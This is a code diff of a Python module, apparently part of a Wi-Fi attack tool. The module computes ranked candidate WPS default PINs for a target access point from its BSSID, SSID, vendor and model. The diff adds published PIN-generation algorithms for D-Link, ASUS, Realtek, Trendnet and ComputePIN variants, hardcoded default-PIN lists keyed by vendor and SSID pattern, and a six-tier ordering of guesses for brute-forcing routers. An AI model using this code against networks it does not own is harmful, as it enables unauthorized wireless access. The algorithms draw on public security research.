@@ -1,34 +1,7 @@
-"""WPS default-PIN generation from published algorithms.
-
-PINs are computed at runtime from published WPS default-PIN algorithms, so no PIN table is
-bundled. The 8th digit is the Wi-Fi Simple Config checksum (:func:`dot11.wsc.crypto.pin_checksum`).
-
-A router's OUI identifies its **brand** (an IEEE assignment) but never its **chipset** (the
-Wi-Fi silicon inside: many brands share one). So candidates split by whether the OUI can tell
-us the PIN applies:
-
-* **Broad** (tried on every AP): the chipset-family algorithms, which can't be tied to a brand
-  from the OUI: ``pin24`` (Broadcom/Atheros/Ralink "ComputePIN") and ``pin_airocon`` (Realtek).
-  (Realtek owns 2 OUIs and Broadcom 31, confirming these are keyed on the chip, not the brand.)
-* **Brand-keyed** (tried only on a matching OUI, see :mod:`wps_router_ouis`): the generators
-  ``pin_dlink`` / ``pin_dlink1`` (D-Link) and ``pin_asus`` (ASUS), plus a few fixed per-brand
-  default PINs (``_VENDOR_STATICS``): Thomson, Edimax, Upvel, D-Link DSL-2740R. Aimed by OUI,
-  so they never cost the lockout budget on other brands' APs.
-
-Algorithm descriptions: bertof/WPS-pin-generator; the devttys0 write-ups; 3WiFi
-(3wifi.stascorp.com/wpspin). To check for newer vendor-specific PINs, see airgeddon's
-``known_pins.db`` (github.com/v1s1t0r1sh3r3/airgeddon).
-
-Deliberately not seeded (can't be tied to a brand from the OUI, so seeding them would just
-spray wrong guesses at every AP): the speculative N-bit / inverted-NIC variants, the chipset
-static constants (Broadcom / Realtek / Airocon), and the ISP-rebrand statics (Onlime, CBN-ONO…).
-Belkin is deferred too (needs the M1 serial). The generic always-try constants live in
-:mod:`pins` (COMMON_PINS).
-"""
-
 from __future__ import annotations
 
-from typing import Callable, Dict, List, Tuple
+import re
+from typing import Callable, List, Optional, Tuple
 
 from wifit3.dot11.wsc.crypto import pin_checksum
 
@@ -36,24 +9,30 @@ Generator = Callable[[bytes], List[str]]
 
 
 def _finalize(raw: int) -> str:
-    """A 7-digit payload int → the full 8-digit PIN with its WSC checksum digit.
-
-    ``:07d`` matters: a payload with a leading zero (e.g. ``05294176``) must keep it.
-    """
     seven = raw % 10_000_000
     return f"{seven:07d}{pin_checksum(seven)}"
 
 
-def _mac(bssid: bytes) -> int:
-    return int.from_bytes(bssid, "big")
-
-
-# --- 24-bit "ComputePIN" (Broadcom/Atheros/Ralink family, the broadest single algorithm) ---
+# --- ComputePIN (Broadcom / Atheros / Ralink reference firmwares) -------------
+# Citation: Stefan Viehböck (2011), "Brute forcing Wi-Fi Protected Setup".
+# Implementation: Zhao Chunsheng (ComputePIN).
 def pin24(bssid: bytes) -> List[str]:
-    return [_finalize(_mac(bssid) & 0xFFFFFF)]
+    nic = int.from_bytes(bssid[3:], "big")
+    return [_finalize(nic)]
 
 
-# --- Airocon / Realtek ---
+def pin_computepin_28(bssid: bytes) -> List[str]:
+    raw = int.from_bytes(bssid[2:], "big") & 0x0FFFFFFF
+    return [_finalize(raw)]
+
+
+def pin_computepin_32(bssid: bytes) -> List[str]:
+    raw = int.from_bytes(bssid[2:], "big")
+    return [_finalize(raw)]
+
+
+# --- Airocon / Realtek (RTL8186 / RTL8196 family) ----------------------------
+# Citation: 3WiFi (stascorp.com/wpspin).
 def pin_airocon(bssid: bytes) -> List[str]:
     b = bssid
     raw = (((b[0] + b[1]) % 10)
@@ -66,65 +45,149 @@ def pin_airocon(bssid: bytes) -> List[str]:
     return [_finalize(raw)]
 
 
-# --- D-Link (Heffner/devttys0 2014) ---
+# --- D-Link (DIR-615, DIR-645, etc.) -----------------------------------------
+# Citation: Craig Heffner / devttys0 (2014), "From China, with Love".
 def _dlink_raw(nic: int) -> int:
     pin = nic ^ 0x55AA55
     pin ^= (((pin & 0x0F) << 4) + ((pin & 0x0F) << 8) + ((pin & 0x0F) << 12)
             + ((pin & 0x0F) << 16) + ((pin & 0x0F) << 20))
     pin %= 10_000_000
-    if pin < 1_000_000:                       # force 7 digits, no leading zero
+    if pin < 1_000_000:
         pin += (pin % 9) * 1_000_000 + 1_000_000
     return pin
 
 
 def pin_dlink(bssid: bytes) -> List[str]:
-    return [_finalize(_dlink_raw(_mac(bssid) & 0xFFFFFF))]
+    nic = int.from_bytes(bssid[3:], "big")
+    return [_finalize(_dlink_raw(nic))]
 
 
 def pin_dlink1(bssid: bytes) -> List[str]:
-    # The WPS radio BSSID is often the label MAC + 1.
-    return [_finalize(_dlink_raw((_mac(bssid) + 1) & 0xFFFFFF))]
+    nic = (int.from_bytes(bssid[3:], "big") + 1) & 0xFFFFFF
+    return [_finalize(_dlink_raw(nic))]
 
 
-# --- ASUS ---
+# --- ASUS (RT series routers) ------------------------------------------------
+# Citation: 3WiFi (stascorp.com/wpspin).
 def pin_asus(bssid: bytes) -> List[str]:
     b = bssid
-    s = b[1] + b[2] + b[3] + b[4] + b[5]
+    s = sum(b[1:])
     digits = "".join(str((b[i % 6] + b[5]) % (10 - (i + s) % 7)) for i in range(7))
     return [_finalize(int(digits))]
 
 
-# --- Dispatch: brand-keyed candidates for a matching OUI, then the broad chipset ones ------
-_BROAD_ALGOS: Tuple[Generator, ...] = (pin24, pin_airocon)
+# --- Inverted NIC ------------------------------------------------------------
+# Citation: 3WiFi (stascorp.com/wpspin).
+def pin_invnic(bssid: bytes) -> List[str]:
+    nic = int.from_bytes(bssid[3:], "big") ^ 0xFFFFFF
+    return [_finalize(nic)]
 
-_VENDOR_ALGOS: Dict[str, Tuple[Generator, ...]] = {
-    "dlink":  (pin_dlink, pin_dlink1),
-    "asus":   (pin_asus,),
-    "belkin": (),   # Arcadyan-Belkin algo needs the M1 serial (deferred); pin24 covers it broadly
+
+# --- Trendnet (TEW series) ---------------------------------------------------
+# Citation: 3WiFi (stascorp.com/wpspin).
+def pin_trendnet(bssid: bytes) -> List[str]:
+    b = bssid
+    raw = b[3] * 10000 + b[4] * 100 + b[5]
+    return [_finalize(raw)]
+
+
+ALGO_DISPATCH: dict[str, Generator] = {
+    "zhao": pin24,
+    "computepin_28": pin_computepin_28,
+    "computepin_32": pin_computepin_32,
+    "dlink": pin_dlink,
+    "dlink1": pin_dlink1,
+    "asus": pin_asus,
+    "airocon": pin_airocon,
+    "trendnet": pin_trendnet,
+    "invnic": pin_invnic,
 }
 
-# Fixed per-brand default PINs, tried only on that brand's routers (aimed by OUI, like the
-# generators, so they never cost the lockout budget on other brands' APs).
-_VENDOR_STATICS: Dict[str, Tuple[str, ...]] = {
-    "dlink":   ("68175542",),                          # DSL-2740R
-    "thomson": ("67958146",),
-    "edimax":  ("35611530",),
-    "upvel":   ("20854836", "43977680", "05294176"),   # Upvel + UR-814AC + UR-825AC
-}
+_HEX_CHARS = "0123456789abcdefABCDEF"
+
+VENDOR_FALLBACK_PINS: Tuple[Tuple[re.Pattern, Tuple[str, ...]], ...] = (
+    (re.compile(r"\bcomtrend\b", re.I), ("18811728", "20172527", "18836486", "49385052", "12715657")),
+    (re.compile(r"\badb\b", re.I), ("16538061", "88202907", "13409708", "47148826", "77828491")),
+    (re.compile(r"\bnetgear\b", re.I), ("12345670", "37380342", "42375852", "30022645", "49945386")),
+    (re.compile(r"\bd-?link\b", re.I), ("46264848", "20172527", "21464065", "68175542", "76229909")),
+    (re.compile(r"\bbelkin|arcadyan\b", re.I), ("12885381", "25751118", "14989346", "53704825", "40770765")),
+    (re.compile(r"\btp-?link\b", re.I), ("12345678", "61116597", "11997870", "41236079", "54080812")),
+    (re.compile(r"\bhuawei\b", re.I), ("12345670", "25905892", "12345678", "85275560", "24684323")),
+    (re.compile(r"\baskey\b", re.I), ("12345670", "20859978", "51327330", "23659391")),
+    (re.compile(r"\bzyxel\b", re.I), ("11866428", "38163289", "15843128", "66202240")),
+    (re.compile(r"\blinksys|cisco\b", re.I), ("70066647", "66026402", "04387411", "13317249")),
+    (re.compile(r"\bthomson|technicolor\b", re.I), ("67958146", "59762454", "74673841", "83712630")),
+    (re.compile(r"\bedimax\b", re.I), ("35611530", "58227046", "85521162")),
+    (re.compile(r"\bupvel\b", re.I), ("20854836", "43977680", "05294176")),
+    (re.compile(r"\btenda\b", re.I), ("40881768", "28818885", "01756401")),
+)
+
+SSID_PATTERN_PINS: Tuple[Tuple[re.Pattern, Tuple[str, ...]], ...] = (
+    (re.compile(r"^WLAN_[0-9A-Fa-f]{4}$"), ("12345670", "11866428", "18836486", "88478760")),
+    (re.compile(r"^JAZZTEL_[0-9A-Fa-f]{2,4}$", re.I), ("20329761", "12345670")),
+    (re.compile(r"^MOVISTAR_[0-9A-Fa-f]{4}$", re.I), ("12345670", "71537573")),
+    (re.compile(r"^Dlink_[0-9A-Fa-f]{4}$", re.I), ("20172527", "21464065")),
+    (re.compile(r"^Vodafone[0-9A-Fa-f]{4}$", re.I), ("71537573", "12345670")),
+    (re.compile(r"^Orange-[0-9A-Fa-f]{4}$", re.I), ("12345670",)),
+)
 
 
-def pins_for(bssid: bytes) -> List[str]:
-    """Ranked, deduped candidate PINs for a 6-byte BSSID.
+def pins_for(
+    bssid: bytes | str,
+    ssid: Optional[str] = None,
+    vendor: Optional[str] = None,
+    model: Optional[str] = None,
+) -> List[str]:
+    """Ranked, deduplicated candidate WPS PINs for a target context."""
+    if isinstance(bssid, str):
+        hexstr = "".join(c for c in bssid if c in _HEX_CHARS)[:12]
+        if len(hexstr) < 12:
+            return []
+        b = bytes.fromhex(hexstr)
+    else:
+        b = bssid
 
-    Brand-keyed candidates (generators + fixed PINs, for a matching OUI) first, then the broad
-    chipset-family generators.
-    """
-    from . import wps_router_ouis    # lazy: table imported only at the first WPS attempt
-    vendor = wps_router_ouis.OUI_VENDOR.get(bssid[:3].hex().upper())
+    from .wps_pindb import MODEL_PINS, OUI_ALGOS, OUI_PINS
+    from wifit3.id import VENDOR_BY_OUI
+
+    oui = b[:3].hex().upper()
     out: List[str] = []
-    for algo in _VENDOR_ALGOS.get(vendor, ()):
-        out += algo(bssid)
-    out += _VENDOR_STATICS.get(vendor, ())
-    for algo in _BROAD_ALGOS:
-        out += algo(bssid)
-    return list(dict.fromkeys(out))     # order-preserving dedup
+
+    # Tier 1: Make / Model exact match
+    if model and model in MODEL_PINS:
+        out.extend(MODEL_PINS[model])
+
+    # Tier 2: OUI exact match (airgeddon + Default-WPS-PINs)
+    if oui in OUI_PINS:
+        out.extend(OUI_PINS[oui])
+
+    # Tier 3: OUI-specific algorithm
+    for algo_name in OUI_ALGOS.get(oui, ()):
+        func = ALGO_DISPATCH.get(algo_name)
+        if func:
+            out.extend(func(b))
+
+    # Tier 4: SSID pattern match
+    if ssid:
+        for pattern, pattern_pins in SSID_PATTERN_PINS:
+            if pattern.search(ssid):
+                out.extend(pattern_pins)
+
+    # Tier 5: Vendor-specific algorithm & fallbacks
+    resolved_vendor = vendor or VENDOR_BY_OUI.get(oui) or ""
+    low_vendor = resolved_vendor.lower()
+    if "dlink" in low_vendor or "d-link" in low_vendor:
+        out.extend(pin_dlink(b))
+        out.extend(pin_dlink1(b))
+    elif "asus" in low_vendor:
+        out.extend(pin_asus(b))
+
+    for pattern, fallback_pins in VENDOR_FALLBACK_PINS:
+        if pattern.search(resolved_vendor):
+            out.extend(fallback_pins)
+
+    # Tier 6: Broad chipset algorithms
+    out.extend(pin24(b))
+    out.extend(pin_airocon(b))
+
+    return list(dict.fromkeys(out))
